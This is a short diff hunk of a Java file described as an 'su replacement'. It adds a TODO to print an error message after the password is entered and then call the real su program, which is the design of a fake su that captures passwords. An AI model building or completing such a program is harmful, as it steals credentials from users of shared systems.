@@ -1,6 +1,9 @@
 // 7-31-2020
 // su replacement
 // run as: java su "username"
+//
+// TODO: Add error message after pass is inputted and call the real su program afterwards
+
 import java.lang.Runtime;
 import java.util.*;
 import java.io.*;
